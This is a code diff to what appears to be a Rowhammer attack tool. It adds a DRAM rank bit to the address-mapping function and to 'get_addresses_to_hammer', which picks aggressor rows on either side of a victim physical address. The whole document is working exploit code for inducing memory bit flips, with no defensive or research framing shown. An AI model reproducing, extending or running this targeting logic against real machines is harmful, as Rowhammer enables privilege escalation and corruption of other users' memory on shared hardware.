@@ -206,21 +206,25 @@ void flush_row(uint8_t *row) {
     }
 }
 
-uint64_t get_dram_address(uint64_t row, int bank, uint64_t col) {
+uint64_t get_dram_address(uint64_t row, int bank, uint64_t col, int64_t rank = -1) {	
     int bank_xor_bits = (row & 0x7) ^ bank;
-    return (row << 16) | (bank_xor_bits << 13) | col;
+    if (rank == -1) {
+    	return (row << 16) | (bank_xor_bits << 13) | col;
+    } else {
+    	return (row << 17) | rank | (bank_xor_bits << 13) | col;
+    }
 }
 
 bool get_addresses_to_hammer(uint64_t victim_phys_addr, uint64_t *attacker_1, uint64_t *attacker_2, int row_diff) {
     int tries = 1000;
     while (tries-- > 0) {
-        uint64_t row = victim_phys_addr >> 16;
+        uint64_t row = victim_phys_addr >> 17;
         uint64_t col = victim_phys_addr & 0x1fff; // 13 bits 
         int bank_xor_bits = (victim_phys_addr >> 13) & 0x7;
         int bank = bank_xor_bits ^ (row & 0x7);
-
-        *attacker_1 = phys_to_virt(get_dram_address(row + row_diff, bank, col));
-        *attacker_2 = phys_to_virt(get_dram_address(row - row_diff, bank, col));
+	uint64_t rank = victim_phys_addr & (1 << 16);
+        *attacker_1 = phys_to_virt(get_dram_address(row + row_diff, bank, col, rank));
+        *attacker_2 = phys_to_virt(get_dram_address(row - row_diff, bank, col, rank));
         if (*attacker_1 != 0 && *attacker_2 != 0) return true;
     }
     return false;
